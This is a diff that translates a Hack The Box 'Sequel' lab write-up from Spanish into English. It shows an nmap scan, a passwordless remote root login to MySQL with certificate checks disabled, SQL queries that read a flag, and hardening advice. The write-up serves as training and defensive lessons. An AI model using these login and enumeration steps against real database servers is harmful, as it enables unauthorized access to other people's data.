@@ -1,79 +1,63 @@
----
-categories:
-  - "[[Ciber]]"
-tags:
-  - vms
-  - pentesting
-  - starting-point
-  - mysql
-  - mariadb
-  - database
-created: 2026-03-13
----
+# Sequel
 
-## 1. Información General
+**Platform:** Hack The Box · **Type:** Starting Point · **OS:** Linux · **Difficulty:** Tier 1
 
-- **Máquina:** Sequel
-- **IP:** 10.129.17.1
-- **SO:** Linux
-- **Dificultad:** Muy fácil
-- **Fecha:** 13/03/2026
+**Summary:** MariaDB/MySQL let `root` log in remotely with no password. From there I enumerated the databases and read the flag from the `config` table in `htb`.
 
-## 2. Resumen Ejecutivo
+## 1. Reconnaissance
 
-Se comprometió un servidor de bases de datos MariaDB/MySQL que presentaba una vulnerabilidad crítica de configuración por defecto: la cuenta de superusuario (`root`) no requería contraseña para conexiones remotas. Tras acceder al servicio mediante el cliente de MySQL, se enumeraron las bases de datos del sistema, identificando la base de datos `htb` y extrayendo la flag almacenada en la tabla `config`.
-
-## 3. Enumeración (Reconocimiento)
-
-### Escaneo de Puertos
-
-Un escaneo dirigido a los puertos de servicios de base de datos detectó el puerto estándar de MySQL abierto:
+A scan against the database port showed MySQL open:
 
 ```bash
 nmap -sV -sC -p 3306 10.129.17.1
 ```
 
-| Puerto | Estado | Servicio | Versión |
+| Port | State | Service | Version |
 | :--- | :--- | :--- | :--- |
-| `3306/tcp` | `open` | `mysql` | MySQL / MariaDB (sin autenticación requerida) |
+| `3306/tcp` | `open` | `mysql` | MySQL / MariaDB (no authentication required) |
 
-## 4. Explotación (Acceso Inicial)
+## 2. Foothold
 
-### Conexión sin Contraseña
-
-Aprovechando la falta de directiva de autenticación para la cuenta `root`, se estableció conexión remota desactivando la verificación estricta de certificados:
+### Passwordless root login
+`root` has no password, so I connected remotely with strict certificate verification turned off:
 
 ```bash
 mysql -u root -h 10.129.17.1 --ssl-verify-server-cert=FALSE
 ```
 
-La sesión se inició con éxito sin solicitar credenciales.
+The session opened without asking for credentials.
 
-### Extracción de Datos
-
-Dentro del prompt interactivo de MySQL:
+### Reading the data
+From the MySQL prompt:
 
 ```sql
--- 1. Listar bases de datos disponibles
+-- 1. List databases
 SHOW DATABASES;
 
--- 2. Seleccionar la base de datos objetivo
+-- 2. Select the target database
 USE htb;
 
--- 3. Listar tablas
+-- 3. List tables
 SHOW TABLES;
 
--- 4. Consultar registros de configuración
+-- 4. Read the config rows
 SELECT * FROM config WHERE id = 5;
 ```
 
-**Resultado de la consulta:**
+Result:
 
-| id | name | value | Observación |
+| id | name | value | Note |
 | :---: | :---: | :---: | :---: |
-| 5 | `flag` | `7b4bec00d1a39e3dd4e021ec3d915da8` | 🚩 **Flag obtenida** |
+| 5 | `flag` | `7b4bec00d1a39e3dd4e021ec3d915da8` | 🚩 **Flag** |
 
-## 5. Lecciones Aprendidas & Remediación
+## 3. Privilege Escalation
 
-- **Hardening de Bases de Datos:** Ejecutar inmediatamente `mysql_secure_installation` tras el despliegue para deshabilitar logins de `root` remotos y forzar contraseñas robustas.
-- **Enlace de Interfaces (Bind Address):** Configurar `bind-address = 127.0.0.1` en `my.cnf` para que el gestor de bases de datos solo acepte conexiones locales, utilizando túneles SSH para administración remota.
+Not applicable: database `root` already has full access to the data.
+
+## 4. Conclusion
+
+**Chain:** MySQL exposed on 3306 → passwordless remote `root` → full database read.
+
+**Remediation:**
+- **Harden the database:** run `mysql_secure_installation` right after deployment to disable remote `root` logins and enforce strong passwords.
+- **Bind address:** set `bind-address = 127.0.0.1` in `my.cnf` so it only accepts local connections, and use SSH tunnels for remote admin.
